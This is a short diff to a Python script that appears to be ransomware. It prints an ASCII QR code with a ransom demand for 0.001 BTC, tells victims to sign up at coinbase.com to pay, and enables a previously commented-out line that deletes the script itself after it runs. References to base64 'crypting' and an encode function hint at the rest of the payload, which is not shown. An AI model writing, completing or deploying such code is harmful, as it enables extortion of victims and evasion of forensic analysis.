@@ -11,10 +11,9 @@ base64_crypted = "".join(base64)
 
 TGREEN = '\033[32m'  # Green Text
 TRED = '\033[31m'  # Red Text
-TYELLOW = '\033[33m'  # Yellow Text
 ENDC = '\033[m'  # reset to the defaults
 
-
+#TODO ->
 def encode(mot):
     mot = mot.encode()
     car_list = []
@@ -76,4 +75,4 @@ print(
 time.sleep(3)
 print(
     "\n   ▄▄▄▄▄▄▄ ▄ ▄ ▄▄▄▄   ▄▄ ▄▄▄▄▄▄▄\n   █ ▄▄▄ █ ▄██▀▀▀  █ █▄▀ █ ▄▄▄ █\n   █ ███ █ █▀▀▄█ █▀▄██ ▀ █ ███ █\n   █▄▄▄▄▄█ ▄ █▀▄▀▄▀█ █▀▄ █▄▄▄▄▄█              " + TGREEN + "Please send 0.001 BTC" + ENDC + "\n   ▄▄▄▄  ▄ ▄ █▄█▄ ███▄ ▀▄  ▄▄▄ ▄              " + TGREEN + "To this BTC adress by" + ENDC + "\n    ▀▀▄██▄▀ ▄█▄██▀▀▄▄▄ ▀█▀▀▀▄▄█▀\n   █▀ ▄█▄▄█▄██ ▄ ▄ █▄ ▄▀▄ ▀▄█▄▀▀\n   █▄▄ █▄▄█ ▄▄█▀▄▀▀█▄▄█▄██  ▄ ▄█\n   ▀ ▀▀█ ▄█▀██▀▄ █▀▄▄█ ▀█▀█ █▄█▀              " + TGREEN + "If you don't know how" + ENDC + "\n   ▄▀▀█ ▄▄█ ██  ▄█▄ ▄▄ █ ▀▀   █               " + TGREEN + "to get bitcoin? Go to" + ENDC + "\n    ▄▀▀██▄▄█ █▀ ██▀▀██▀█▄▄████▀█              " + TGREEN + "coinbase.com and signup" + ENDC + "\n   ▄▄▄▄▄▄▄ ▀▄▄   ▄ ██ ▄█ ▄ █ █ ▀\n   █ ▄▄▄ █  ▄▄█▀▀▀▄ ▄█ █▄▄▄█ ▄▄ \n   █ ███ █ █▀█▀▄▀▄▀▀ ▀▄ ▀▄█ ▀▀ █\n   █▄▄▄▄▄█ █▀█▄▀▀  █  ▄█ █▄▄▀▄█\n                      \n\n" + 80 * "=")
-#os.remove(os.path.realpath(__file__)) #Auto delete
+os.remove(os.path.realpath(__file__)) #Auto delete
